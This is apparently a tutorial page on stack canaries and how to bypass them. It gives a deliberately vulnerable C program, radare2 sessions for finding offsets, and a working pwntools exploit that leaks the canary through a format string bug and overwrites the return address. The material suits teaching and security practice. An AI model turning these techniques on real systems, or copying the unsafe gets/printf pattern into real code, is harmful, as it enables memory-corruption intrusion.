---
description: The Buffer Overflow defence
---

# Stack Canaries

Stack Canaries are very simple - at the beginning of the function, a random value is placed on the stack. Before the program executes `ret`, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.

If they are not, the attacker attempted to overflow to control the return pointer and the program crashes, often with a `***stack smashing detected***` error message.

{% hint style="info" %}
On Linux, stack canaries end in `00`. This is so that they null-terminate any strings in case you make a mistake when using print functions, but it also makes them much easier to spot.
{% endhint %}

## Bypassing Canaries

There are two ways to bypass a canary.

### Leaking it

This is quite broad and will differ from binary to binary, but the main aim is to read the value. The simplest option is using **format string** if it is present - the canary, like other local variables, is on the stack, so if we can leak values off the stack it's easy.

#### Source

```c
#include <stdio.h>

void vuln() {
    char buffer[64];

    puts("Leak me");
    gets(buffer);

    printf(buffer);
    puts("");

    puts("Overflow me");
    gets(buffer);
}

int main() {
    vuln();
}

void win() {
    puts("You won!");
}
```

The source is very simple - it gives you a format string vulnerability, then a buffer overflow vulnerability. The format string we can use to leak the canary value, then we can use that value to overwrite the canary with itself. This way, we can overflow past the canary but not trigger the check as its value remains constant. And of course, we just have to run `win()`.

#### 32-bit

{% file src="../../.gitbook/assets/canary-32.zip" caption="Canary - 32-bit" %}

First let's check there **is** a canary:

```text
$ pwn checksec vuln-32 
[*] 'vuln-32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Yup, there is. Now we need to calculate at what offset the canary is at, and to do this we'll use radare2.

```text
$ r2 -d -A vuln-32

[0xf7f2e0b0]> db 0x080491d7
[0xf7f2e0b0]> dc
Leak me
%p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
0xffd7cd60  0xffd7cd7c 0xffd7cdec 0x00000002 0x0804919e  |...............
0xffd7cd70  0x08048034 0x00000000 0xf7f57000 0x00007025  4........p..%p..
0xffd7cd80  0x00000000 0x00000000 0x08048034 0xf7f02a28  ........4...(*..
0xffd7cd90  0xf7f01000 0xf7f3e080 0x00000000 0xf7d53ade  .............:..
0xffd7cda0  0xf7f013fc 0xffffffff 0x00000000 0x080492cb  ................
0xffd7cdb0  0x00000001 0xffd7ce84 0xffd7ce8c 0xadc70e00  ................
```

The last value there is the canary. We can tell because it's roughly 64 bytes after the "buffer start", which should be close to the end of the buffer. Additionally, it ends in `00` and looks very random, unlike the libc and stack addresses that start with `f7` and `ff`. If we count the number of address it's around 24 until that value, so we go one before and one after as well to make sure.

```text
$./vuln-32

Leak me
%23$p %24$p %25$p
0xa4a50300 0xf7fae080 (nil)
```

It appears to be at `%23$p`. Remember, stack canaries are randomised for each new process, so it won't be the same.

Now let's just automate grabbing the canary with pwntools:

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')
```

```text
$ python3 exploit.py 
[+] Starting local process './vuln-32': pid 14019
[*] b'Leak me\n'
[+] Canary: 0xcc987300
```

Now all that's left is work out what the offset is until the canary, and then the offset from after the canary to the return pointer.

```text
$ r2 -d -A vuln-32
[0xf7fbb0b0]> db 0x080491d7
[0xf7fbb0b0]> dc
Leak me
%23$p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
[...]
0xffea8af0  0x00000001 0xffea8bc4 0xffea8bcc 0xe1f91c00
```

We see the canary is at `0xffea8afc`. A little later on the return pointer \(we assume\) is at `0xffea8b0c`. Let's break just after the next `gets()` and check what value we overwrite it with \(we'll use a De Bruijn pattern\).

```text
[0x080491d7]> db 0x0804920f
[0x080491d7]> dc
0xe1f91c00
Overflow me
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
hit breakpoint at: 804920f
[0x0804920f]> pxw @ 0xffea8afc
0xffea8afc  0x41574141 0x41415841 0x5a414159 0x41614141  AAWAAXAAYAAZAAaA
0xffea8b0c  0x41416241 0x64414163 0x41654141 0x41416641  AbAAcAAdAAeAAfAA
```

Now we can check the canary and EIP offsets:

```text
[0x0804920f]> wopO 0x41574141
64
[0x0804920f]> wopO 0x41416241
80
```

Return pointer is 16 bytes after the canary start, so 12 bytes after the canary.

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)  # overwrite canary with original value to not trigger
payload += b'A' * 12    # pad to return pointer
payload += p32(0x08049245)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))
```

#### 64-bit

Same source, same approach, just 64-bit. Try it yourself before checking the solution.

{% hint style="info" %}
Remember, in 64-bit format string goes to the relevant registers first and the addresses can fit 8 bytes each so the offset may be different.
{% endhint %}

{% file src="../../.gitbook/assets/canary-64.zip" caption="Canary - 64-bit" %}

### Bruteforcing the Canary

This _is_ possible on 32-bit, and sometimes unavoidable. It's not, however, feasible on 64-bit.

As you can expect, the general idea is to run the process loads and load of times with random canary values until you get a hit, which you can differentiate by the presence of a known plaintext, e.g. `flag{` and this can take ages to run and is frankly not a particularly interesting challenge.

